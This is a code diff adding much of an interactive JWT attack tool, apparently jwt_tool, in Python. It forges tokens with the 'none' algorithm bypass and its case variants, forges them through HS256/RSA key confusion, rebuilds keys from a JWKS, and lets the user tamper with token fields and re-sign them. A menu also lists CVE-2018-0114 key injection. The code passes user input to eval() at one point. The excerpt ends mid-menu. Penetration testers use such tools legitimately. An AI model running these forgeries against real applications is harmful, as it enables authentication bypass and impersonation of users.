@@ -488,3 +488,503 @@ def parseJWKS(jwksfile):
             print("[+] "+pubKeyName)
             print("\nAttempting to verify token using "+pubKeyName)
             valid = verifyTokenEC(headDict, paylDict, sig, pubKeyName)
+        except:
+            pass
+        try:
+            kid = 1
+            n = str(jwksDict["n"])
+            e = str(jwksDict["e"])
+            print("\nFound RSA key factors, generating a public key")
+            pubKeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
+            print("[+] "+pubKeyName)
+            print("\nAttempting to verify token using "+pubKeyName)
+            valid = verifyTokenRSA(headDict, paylDict, sig, pubKeyName)
+        except:
+            pass
+
+def genECPubFromJWKS(x, y, kid, nowtime):
+    try:
+        x = int.from_bytes(base64.urlsafe_b64decode(x), byteorder='big')
+    except:
+        pass
+    try:
+        x = int.from_bytes(base64.urlsafe_b64decode(x+"="), byteorder='big')
+    except:
+        pass
+    try:
+        x = int.from_bytes(base64.urlsafe_b64decode(x+"=="), byteorder='big')
+    except:
+        pass
+    try:
+        y = int.from_bytes(base64.urlsafe_b64decode(y), byteorder='big')
+    except:
+        pass
+    try:
+        y = int.from_bytes(base64.urlsafe_b64decode(y+"="), byteorder='big')
+    except:
+        pass
+    try:
+        y = int.from_bytes(base64.urlsafe_b64decode(y+"=="), byteorder='big')
+    except:
+        pass
+    new_key = ECC.construct(curve='P-256', point_x=x, point_y=y)
+    pubKey = new_key.public_key().export_key(format="PEM")+"\n"
+    pubKeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
+    with open(pubKeyName, 'w') as test_pub_out:
+        test_pub_out.write(pubKey)
+    return pubKeyName
+
+def genRSAPubFromJWKS(n, e, kid, nowtime):
+    try:
+        n = int.from_bytes(base64.urlsafe_b64decode(n), byteorder='big')
+    except:
+        pass
+    try:
+        n = int.from_bytes(base64.urlsafe_b64decode(n+"="), byteorder='big')
+    except:
+        pass
+    try:
+        n = int.from_bytes(base64.urlsafe_b64decode(n+"=="), byteorder='big')
+    except:
+        pass
+    try:
+        e = int.from_bytes(base64.urlsafe_b64decode(e), byteorder='big')
+    except:
+        pass
+    try:
+        e = int.from_bytes(base64.urlsafe_b64decode(e+"="), byteorder='big')
+    except:
+        pass
+    try:
+        e = int.from_bytes(base64.urlsafe_b64decode(e+"=="), byteorder='big')
+    except:
+        pass
+    new_key = RSA.construct((n, e))
+    pubKey = new_key.publickey().exportKey(format="PEM")
+    pubKeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
+    with open(pubKeyName, 'w') as test_pub_out:
+        test_pub_out.write(pubKey.decode()+"\n")
+    return pubKeyName
+
+def checkAlgNone(headDict, tok2):
+    print("\n====================================================================\nThis option attempts to use the \"none\" algorithm option in some \nimplementations of JWT so that the signature is stripped entirely \nand the token can be freely tampered with. \nIf successful you can use the Tamper options to forge whatever token \ncontent you like!\n====================================================================")
+    print("\nGenerating alg-stripped tokens...")
+    alg1 = "none"
+    newHead1 = buildHead(alg1, headDict)
+    CVEToken0 = newHead1+"."+tok2+"."
+    alg = "None"
+    newHead = buildHead(alg, headDict)
+    CVEToken1 = newHead+"."+tok2+"."
+    alg = "NONE"
+    newHead = buildHead(alg, headDict)
+    CVEToken2 = newHead+"."+tok2+"."
+    alg = "nOnE"
+    newHead = buildHead(alg, headDict)
+    CVEToken3 = newHead+"."+tok2+"."
+    print("\nSet this new token as the AUTH cookie, or session/local \nstorage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
+    print("\n====================================================================\n")
+    print("Your new forged token:")
+    print("\"alg\": \"none\":\n"+CVEToken0)
+    print("\n====================================================================\nSome variants, which may work on some JWT libraries:\n")
+    print("\"alg\": \"None\":\n"+CVEToken1+"\n")
+    print("\"alg\": \"NONE\":\n"+CVEToken2+"\n")
+    print("\"alg\": \"nOnE\":\n"+CVEToken3)
+    print("====================================================================")
+
+def checkPubKey(headDict, tok2, pubKey):
+    print("\n====================================================================\nThis option takes an available Public Key (the SSL certificate from \na webserver, for example?) and switches the RSA-signed \n(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.\n====================================================================")
+    try:
+        key = open(pubKey).read()
+        print("File loaded: "+pubKey)
+    except:
+        print("[-] File not found")
+        exit(1)
+    newHead = headDict
+    newHead["alg"] = "HS256"
+    newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
+    newTok = newHead+"."+tok2
+    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
+    print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
+    print("\n"+newTok+"."+newSig)
+
+def tamperToken(paylDict, headDict, sig):
+    print("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================")
+    print("\nToken header values:")
+    while True:
+        i = 0
+        headList = [0]
+        for pair in headDict:
+            menuNum = i+1
+            if isinstance(headDict[pair], dict):
+                print("["+str(menuNum)+"] "+pair+" = JSON object:")
+                for subclaim in headDict[pair]:
+                    print("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]))
+            else:
+                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
+            headList.append(pair)
+            i += 1
+        print("["+str(i+1)+"] *ADD A VALUE*")
+        print("["+str(i+2)+"] *DELETE A VALUE*")
+        print("[0] Continue to next step")
+        selection = ""
+        print("\nPlease select a field number:\n(or 0 to Continue)")
+        try:
+            selection = int(input("> "))
+        except:
+            print("Invalid selection")
+            exit(1)
+        if selection<len(headList) and selection>0:
+            if isinstance(headDict[headList[selection]], dict):
+                print("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)")
+                newVal = OrderedDict()
+                for subclaim in headDict[headList[selection]]:
+                    newVal[subclaim] = headDict[pair][subclaim]
+                while True:
+                    subList = [0]
+                    s = 0
+                    # for subclaim in headDict[headList[selection]]:
+                    for subclaim in newVal:
+                        subNum = s+1
+                        print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
+                        s += 1
+                        subList.append(subclaim)
+                    print("["+str(s+1)+"] *ADD A VALUE*")
+                    print("["+str(s+2)+"] *DELETE A VALUE*")
+                    print("[0] Continue to next step")
+                    try:
+                        subSel = int(input("> "))
+                    except:
+                        print("Invalid selection")
+                        exit(1)
+                    if subSel<=len(newVal) and subSel>0:
+                        selClaim = subList[subSel]
+                        print("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]))
+                        print("Please enter new value and hit ENTER")
+                        newVal[selClaim] = input("> ")
+                        print()
+                    elif subSel == s+1:
+                        print("Please enter new Key and hit ENTER")
+                        newPair = input("> ")
+                        print("Please enter new value for "+newPair+" and hit ENTER")
+                        newVal[newPair] = input("> ")
+                    elif subSel == s+2:
+                        print("Please select a Key to DELETE and hit ENTER")
+                        s = 0
+                        for subclaim in newVal:
+                            subNum = s+1
+                            print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
+                            subList.append(subclaim)
+                            s += 1
+                        try:
+                            selSub = int(input("> "))
+                        except:
+                            print("Invalid selection")
+                            exit(1)
+                        delSub = subList[selSub]
+                        del newVal[delSub]
+                    elif subSel == 0:
+                        print()
+                        break
+            else:
+                print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
+                print("Please enter new value and hit ENTER")
+                newVal = input("> ")
+            headDict[headList[selection]] = newVal
+        elif selection == i+1:
+            print("Please enter new Key and hit ENTER")
+            newPair = input("> ")
+            print("Please enter new value for "+newPair+" and hit ENTER")
+            newVal = input("> ")
+            headList.append(newPair)
+            headDict[headList[selection]] = newVal
+        elif selection == i+2:
+            print("Please select a Key to DELETE and hit ENTER")
+            i = 0
+            for pair in headDict:
+                menuNum = i+1
+                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
+                headList.append(pair)
+                i += 1
+            try:
+                delPair = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            del headDict[headList[delPair]]
+        elif selection == 0:
+            break
+        else:
+            exit(1)
+    print("\nToken payload values:")
+    while True:
+        comparestamps, expiredtoken = dissectPayl(paylDict, count=True)
+        i = 0
+        paylList = [0]
+        for pair in paylDict:
+            menuNum = i+1
+            paylList.append(pair)
+            i += 1
+        print("["+str(i+1)+"] *ADD A VALUE*")
+        print("["+str(i+2)+"] *DELETE A VALUE*")
+        if len(comparestamps) > 0:
+            print("["+str(i+3)+"] *UPDATE TIMESTAMPS*")
+        print("[0] Continue to next step")
+        selection = ""
+        print("\nPlease select a field number:\n(or 0 to Continue)")
+        try:
+            selection = int(input("> "))
+        except:
+            print("Invalid selection")
+            exit(1)
+        if selection<len(paylList) and selection>0:
+            print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
+            print("Please enter new value and hit ENTER")
+            newVal = input("> ")
+            paylDict[paylList[selection]] = newVal
+        elif selection == i+1:
+            print("Please enter new Key and hit ENTER")
+            newPair = input("> ")
+            print("Please enter new value for "+newPair+" and hit ENTER")
+            newVal = input("> ")
+            try:
+                newVal = int(newVal)
+            except:
+                pass
+            paylList.append(newPair)
+            paylDict[paylList[selection]] = newVal
+        elif selection == i+2:
+            print("Please select a Key to DELETE and hit ENTER")
+            i = 0
+            for pair in paylDict:
+                menuNum = i+1
+                print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
+                paylList.append(pair)
+                i += 1
+            delPair = eval(input("> "))
+            del paylDict[paylList[delPair]]
+        elif selection == i+3:
+            print("Timestamp updating:")
+            print("[1] Update earliest timestamp to current time (keeping offsets)")
+            print("[2] Add 1 hour to timestamps")
+            print("[3] Add 1 day to timestamps")
+            print("[4] Remove 1 hour from timestamps")
+            print("[5] Remove 1 day from timestamps")
+            print("\nPlease select an option from above (1-5):")
+            try:
+                selection = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            if selection == 1:
+                nowtime = int(datetime.datetime.now().timestamp())
+                timecomp = {}
+                for timestamp in comparestamps:
+                    timecomp[timestamp] = paylDict[timestamp]
+                earliest = min(timecomp, key=timecomp.get)
+                earlytime = paylDict[earliest]
+                for timestamp in comparestamps:
+                    if timestamp == earliest:
+                        paylDict[timestamp] = nowtime
+                    else:
+                        difftime = int(paylDict[timestamp])-int(earlytime)
+                        paylDict[timestamp] = nowtime+difftime
+            elif selection == 2:
+                for timestamp in comparestamps:
+                    newVal = int(paylDict[timestamp])+3600
+                    paylDict[timestamp] = newVal
+            elif selection == 3:
+                for timestamp in comparestamps:
+                    newVal = int(paylDict[timestamp])+86400
+                    paylDict[timestamp] = newVal
+            elif selection == 4:
+                for timestamp in comparestamps:
+                    newVal = int(paylDict[timestamp])-3600
+                    paylDict[timestamp] = newVal
+            elif selection == 5:
+                for timestamp in comparestamps:
+                    newVal = int(paylDict[timestamp])-86400
+                    paylDict[timestamp] = newVal
+            else:
+                print("Invalid selection")
+                exit(1)
+        elif selection == 0:
+            break
+        else:
+            exit(1)
+    print("\nToken Signing:")
+    print("[1] Sign token with known HMAC-SHA 'secret'")
+    print("[2] Sign token with RSA/ECDSA Private Key")
+    print("[3] Strip signature using the \"none\" algorithm")
+    print("[4] Sign with HS/RSA key confusion vulnerability")
+    print("[5] Sign token with key file")
+    print("[6] Inject a key and self-sign the token (CVE-2018-0114)")
+    print("[7] Self-sign the token and export an external JWKS")
+    print("[8] Keep original signature")
+    print("\nPlease select an option from above (1-5):")
+    try:
+        selection = int(input("> "))
+    except:
+        print("Invalid selection")
+        exit(1)
+    if selection == 1:
+        print("\nPlease enter the known key:")
+        key = input("> ")
+        print("\nPlease enter the keylength:")
+        print("[1] HMAC-SHA256")
+        print("[2] HMAC-SHA384")
+        print("[3] HMAC-SHA512")
+        try:
+            selLength = int(input("> "))
+        except:
+            print("Invalid selection")
+            exit(1)
+        if selLength == 1:
+            keyLength = 256
+        elif selLength == 2:
+            keyLength = 384
+        elif selLength == 3:
+            keyLength = 512
+        else:
+            print("Invalid selection")
+            exit(1)
+        newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
+        print("\nYour new forged token:")
+        print("[+] URL safe: "+newContents+"."+newSig)
+        print("[+] Standard: "+newContents+"."+badSig+"\n")
+        exit(1)
+    if selection == 2:
+        print("\nPlease select an option:")
+        print("[1] RSA key signing")
+        print("[2] ECDSA key signing")
+        print("[3] PSS key signing")
+        try:
+            selLength = int(input("> "))
+        except:
+            print("Invalid selection")
+            exit(1)
+        if selLength == 1:
+            print("\nPlease select an option:")
+            print("[1] Generate new RSA key pair")
+            print("[2] Use existing RSA Private Key")
+            try:
+                selLength = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            if selLength == 1:
+                nowtime = str(int(datetime.datetime.now().timestamp()))
+                pubKey, privKey = newRSAKeyPair()
+                privKeyName = "private_jwttool_RSA_"+nowtime+".pem"
+                pubKeyName = "public_jwttool_RSA_"+nowtime+".pem"
+                with open(privKeyName, 'w') as test_priv_out:
+                    test_priv_out.write(privKey.decode())
+                with open(pubKeyName, 'w') as test_pub_out:
+                    test_pub_out.write(pubKey.decode())
+                print("\nKey pair created and exported as:\n"+pubKeyName+"\n"+privKeyName+"\n")
+            elif selLength == 2:
+                print("\nPlease enter the filename of the RSA Private Key:")
+                privKeyName = input("> ")
+            else:
+                print("Invalid selection")
+                exit(1)
+            print("\nPlease enter the keylength:")
+            print("[1] RSA-256")
+            print("[2] RSA-384")
+            print("[3] RSA-512")
+            try:
+                selLength = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            if selLength == 1:
+                keyLength = 256
+            elif selLength == 2:
+                keyLength = 384
+            elif selLength == 3:
+                keyLength = 512
+            else:
+                print("Invalid selection")
+                exit(1)
+            newSig, badSig, newContents = signTokenRSA(headDict, paylDict, privKeyName, keyLength)
+            print("\nYour new forged token:")
+            print("[+] URL safe: "+newContents+"."+newSig)
+            print("[+] Standard: "+newContents+"."+badSig+"\n")
+            exit(1)
+        elif selLength == 2:
+            print("\nPlease select an option:")
+            print("[1] Generate new ECDSA key pair")
+            print("[2] Use existing ECDSA Private Key")
+            try:
+                selLength = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            if selLength == 1:
+                nowtime = str(int(datetime.datetime.now().timestamp()))
+                pubKey, privKey = newECKeyPair()
+                privKeyName = "private_jwttool_EC_"+nowtime+".pem"
+                pubKeyName = "public_jwttool_EC_"+nowtime+".pem"
+                with open(privKeyName, 'w') as test_priv_out:
+                    test_priv_out.write(privKey)
+                with open(pubKeyName, 'w') as test_pub_out:
+                    test_pub_out.write(pubKey)
+                print("\nKey pair created and exported as:\n"+pubKeyName+"\n"+privKeyName+"\n")
+            elif selLength == 2:
+                print("\nPlease enter the filename of the ECDSA Private Key:")
+                privKeyName = input("> ")
+            else:
+                print("Invalid selection")
+                exit(1)
+            print("\nPlease enter the keylength:")
+            print("[1] ECDSA-256")
+            print("[2] ECDSA-384")
+            print("[3] ECDSA-512")
+            try:
+                selLength = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            if selLength == 1:
+                keyLength = 256
+            elif selLength == 2:
+                keyLength = 384
+            elif selLength == 3:
+                keyLength = 512
+            else:
+                print("Invalid selection")
+                exit(1)
+            newSig, badSig, newContents = signTokenEC(headDict, paylDict, privKeyName, keyLength)
+            print("\nYour new forged token:")
+            print("[+] URL safe: "+newContents+"."+newSig)
+            print("[+] Standard: "+newContents+"."+badSig+"\n")
+            exit(1)
+        elif selLength == 3:
+            print("\nPlease select an option:")
+            print("[1] Generate new RSA key pair")
+            print("[2] Use existing RSA Private Key")
+            try:
+                selLength = int(input("> "))
+            except:
+                print("Invalid selection")
+                exit(1)
+            if selLength == 1:
+                nowtime = str(int(datetime.datetime.now().timestamp()))
+                pubKey, privKey = newRSAKeyPair()
+                privKeyName = "private_jwttool_RSA_"+nowtime+".pem"
+                pubKeyName = "public_jwttool_RSA_"+nowtime+".pem"
+                with open(privKeyName, 'w') as test_priv_out:
+                    test_priv_out.write(privKey.decode())
+                with open(pubKeyName, 'w') as test_pub_out:
+                    test_pub_out.write(pubKey.decode())
+                print("\nKey pair created and exported as:\n"+pubKeyName+"\n"+privKeyName+"\n")
+            elif selLength == 2:
+                print("\nPlease enter the filename of the RSA Private Key:")
+                privKeyName = input("> ")
+            else:
+                print("Invalid selection")
+                exit(1)
+            print("\nPlease enter the keylength:")
+            print("[1] RSA-256")
+            print("[2] RSA-384")
+            print("[3] RSA-512")
+            try:
